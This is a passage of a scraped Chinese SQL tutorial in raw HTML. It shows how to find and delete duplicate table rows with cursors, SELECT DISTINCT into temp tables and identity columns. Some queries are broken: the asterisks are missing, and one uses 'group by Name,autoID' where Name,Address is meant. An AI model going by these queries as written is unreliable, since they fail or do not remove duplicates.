onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">(三)<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">方法一<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><font face=\"Courier New\"><span style=\"color: #0000ff\">declare</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #008000\">@max</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #000000\">integer</span><span style=\"color: #000000\">,</span><span style=\"color: #008000\">@id</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #000000\">integer</span></font><span style=\"color: #000000\"><br><br><font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><font face=\"Courier New\"><span style=\"color: #0000ff\">declare</span><span style=\"color: #000000\">&nbsp;cur_rows&nbsp;</span><span style=\"color: #0000ff\">cursor</span><span style=\"color: #000000\">&nbsp;local&nbsp;</span><span style=\"color: #0000ff\">for</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;主字段,</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\"></span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;表名&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: #000000\">&nbsp;主字段&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\"><em></em></span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">；&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><span style=\"color: #000000\"><br><br><font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><span style=\"color: #0000ff\"><font face=\"Courier New\">open</font></span><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;cur_rows<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">fetch</span><span style=\"color: #000000\">&nbsp;cur_rows&nbsp;</span><span style=\"color: #0000ff\">into</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #008000\">@id</span><span style=\"color: #000000\">,</span><span style=\"color: #008000\">@max</span></font><span style=\"color: #000000\"><br><br><font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><font face=\"Courier New\"><span style=\"color: #0000ff\">while</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #008000\">@@fetch_status</span><span style=\"color: #808080\">=</span><span style=\"font-weight: bold; color: #800000\">0</span></font><span style=\"color: #000000\"><br><br><font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><span style=\"color: #0000ff\"><font face=\"Courier New\">begin</font></span><span style=\"color: #000000\"><br><br><font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><font face=\"Courier New\"><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #008000\">@max</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">=</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #008000\">@max</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">-</span><span style=\"font-weight: bold; color: #800000\">1</span></font><span style=\"color: #000000\"><br><br><font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><font face=\"Courier New\"><span style=\"color: #0000ff\">set</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">rowcount</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #008000\">@max</span></font><span style=\"color: #000000\"><br><br><font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><font face=\"Courier New\"><span style=\"color: #0000ff\">delete</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;表名&nbsp;</span><span style=\"color: #0000ff\">where</span><span style=\"color: #000000\">&nbsp;主字段&nbsp;</span><span style=\"color: #808080\">=</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #008000\">@id</span></font><span style=\"color: #000000\"><br><br><font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><font face=\"Courier New\"><span style=\"color: #0000ff\">fetch</span><span style=\"color: #000000\">&nbsp;cur_rows&nbsp;</span><span style=\"color: #0000ff\">into</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #008000\">@id</span><span style=\"color: #000000\">,</span><span style=\"color: #008000\">@max</span></font><span style=\"color: #000000\"><br><br><font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><span style=\"color: #0000ff\"><font face=\"Courier New\">end</font></span><span style=\"color: #000000\"><br><br><font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><span style=\"color: #0000ff\"><font face=\"Courier New\">close</font></span><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;cur_rows<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">set</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">rowcount</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">0</span></font><span style=\"color: #000000\"><br><br><font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">方法二<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">　　有两个意义上的重复记录，一是完全重复的记录，也即所有字段均重复的记录，二是部分关键字段重复的记录，比如Name字段重复，而其他字段不一定重复或都重复可以忽略。<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><span style=\"font-weight: bold; color: #800000\"><font face=\"Courier New\">1</font></span><font face=\"Courier New\"><span style=\"color: #000000\">、对于第一种重复，比较容易解决，使用<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">distinct</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\"></span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;tableName<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">就可以得到无重复记录的结果集。<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">如果该表需要删除重复的记录（重复记录保留1条），可以按以下方法删除<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">distinct</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\"><em></em></span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">into</span><span style=\"color: #000000\">&nbsp;#Tmp&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;tableName<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">drop</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">table</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;tableName<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\"></span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">into</span><span style=\"color: #000000\">&nbsp;tableName&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;#Tmp<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">drop</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">table</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;#Tmp<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">发生这种重复的原因是表设计不周产生的，增加唯一索引列即可解决。<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"font-weight: bold; color: #800000\">2</span></font><font face=\"Courier New\"><span style=\"color: #000000\">、这类重复问题通常要求保留重复记录中的第一条记录，操作方法如下<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">假设有重复的字段为Name,Address，要求得到这两个字段唯一的结果集<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">identity</span><span style=\"color: #000000\">(</span><span style=\"font-weight: bold; color: #000000\">int</span><span style=\"color: #000000\">,</span><span style=\"font-weight: bold; color: #800000\">1</span><span style=\"color: #000000\">,</span><span style=\"font-weight: bold; color: #800000\">1</span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #0000ff\">as</span><span style=\"color: #000000\">&nbsp;autoID,&nbsp;</span><span style=\"color: #808080\"><em></em></span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">into</span><span style=\"color: #000000\">&nbsp;#Tmp&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;tableName<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">min</span><span style=\"color: #000000\">(autoID)&nbsp;</span><span style=\"color: #0000ff\">as</span><span style=\"color: #000000\">&nbsp;autoID&nbsp;</span><span style=\"color: #0000ff\">into</span><span style=\"color: #000000\">&nbsp;#Tmp2&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;#Tmp&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;Name,autoID<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\"></span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;#Tmp&nbsp;</span><span style=\"color: #0000ff\">where</span><span style=\"color: #000000\">&nbsp;autoID&nbsp;</span><span style=\"color: #808080\">in</span><span style=\"color: #000000\">(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;autoID&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;#tmp2)<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">最后一个select即得到了Name，Address不重复的结果集（但多了一个autoID字段，实际写时可以写在select子句中省去此列）<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">(四)</span></font></div><br><div><font face=\"Courier New\"><span style=\"color: #000000\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">查询重复<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;tablename&nbsp;</span><span style=\"color: #0000ff\">where</span><span style=\"color: #000000\">&nbsp;id&nbsp;</span><span style=\"color: #808080\">in</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;(<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;id&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;tablename&nbsp;<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;id&nbsp;<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(id)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><span style=\"color: #000000\"><br><br><font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">)</font></span></div><br></div>","excerpt":"","more":"<div id=\"cnblogs_post_body\"><div><span style=\"font-weight: bold; color: #800000\"><font face=\"Courier New\">&nbsp;1</font></span><font face=\"Courier New\"><span style=\"color: #000000\">、查找表中多余的重复记录，重复记录是根据单个字段（peopleId）来判断<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\"><em></span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;people<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">where</span><span style=\"color: #000000\">&nbsp;peopleId&nbsp;</span><span style=\"color: #808080\">in</span><span style=\"color: #000000\">&nbsp;(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;&nbsp;peopleId&nbsp;&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;&nbsp;people&nbsp;&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: #000000\">&nbsp;&nbsp;peopleId&nbsp;&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(peopleId)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><font face=\"Courier New\"><span style=\"color: #000000\">)</span></font></div><br><div><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;例二：</span></font></div><br><div><font face=\"Courier New\"><span style=\"color: #000000\"><font color=\"#0000ff\">&nbsp;select</font> </em> <font color=\"#0000ff\">from</font> testtable</span></font></div><br><div><font face=\"Courier New\"><span style=\"color: #000000\"><font color=\"#0000ff\">&nbsp;where</font> numeber in (<font color=\"#0000ff\">select</font> number <font color=\"#0000ff\">from</font> people <font color=\"#0000ff\">group by</font> number <font color=\"#0000ff\">having count</font>(number) &gt; 1 )</span></font></div><br><div><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;可以查出testtable表中number相同的记录<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"font-weight: bold; color: #800000\">2</span></font><font face=\"Courier New\"><span style=\"color: #000000\">、删除表中多余的重复记录，重复记录是根据单个字段（peopleId）来判断，只留有rowid最小的记录<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">delete</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: 